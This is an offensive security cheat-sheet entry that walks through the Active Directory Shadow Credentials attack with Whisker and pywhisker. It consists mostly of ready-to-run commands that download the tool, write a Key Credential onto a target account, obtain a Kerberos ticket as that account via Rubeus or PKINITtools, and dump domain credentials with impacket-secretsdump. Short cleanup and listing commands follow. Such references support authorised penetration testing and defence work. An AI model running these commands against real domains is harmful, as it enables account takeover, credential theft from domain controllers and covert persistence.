# 03.39 Whisker pywhisker

> Shadow Credentials attack — add a Key Credential Link to a target account to authenticate as it.

## Overview

Whisker (.NET, Windows) and pywhisker (Python, Linux) implement the Shadow Credentials attack. Given AddSelf/AddKeyCredentialLink rights on a target account, you write a Key Credential (cert + private key) onto msDS-KeyCredentialLink. Then PKINIT authenticate with that cert → get TGT for the target account. Persistence-friendly — your cert stays in the account's attribute until cleaned up.

## Steps

- **Step 1** - Identify target object you have write rights on.
- **Step 2** - Run Whisker/pywhisker add → generates .pfx.
- **Step 3** - Authenticate with .pfx via Rubeus (Windows) or getTGT.py (Linux).
- **Step 4** - Cleanup by removing the Key Credential.

## Commands

### Whisker — Windows

```powershell
iwr 'https://github.com/eladshamir/Whisker/releases/latest/download/Whisker.exe' -OutFile Whisker.exe
Whisker.exe add /target:<TARGET-USER>\$
# Outputs Rubeus command with the cert+key
```

### Authenticate as target (Rubeus)

```powershell
Rubeus.exe asktgt /user:<TARGET-USER>\$ /certificate:<BASE64-PFX> /password:<PFX-PASS> /domain:<DOMAIN> /dc:<DC-FQDN> /ptt
```

### pywhisker — Linux

```bash
pip3 install pywhisker
pywhisker -d <DOMAIN> -u <USER> -p <PASS> --target <TARGET-USER> --action add
# Saves <TARGET-USER>.pfx
```

### Authenticate as target (Impacket)

```bash
# Get TGT using PKINITtools
git clone https://github.com/dirkjanm/PKINITtools
python3 PKINITtools/gettgtpkinit.py -cert-pfx <TARGET-USER>.pfx -pfx-pass <PFX-PASS> <DOMAIN>/<TARGET-USER> <TARGET-USER>.ccache
export KRB5CCNAME=<TARGET-USER>.ccache
impacket-secretsdump -k -no-pass <DC-FQDN>
```

### Cleanup

```bash
pywhisker -d <DOMAIN> -u <USER> -p <PASS> --target <TARGET-USER> --action remove --device-id <DEVICE-GUID>
```

### List existing Key Credentials

```bash
pywhisker -d <DOMAIN> -u <USER> -p <PASS> --target <TARGET-USER> --action list
```
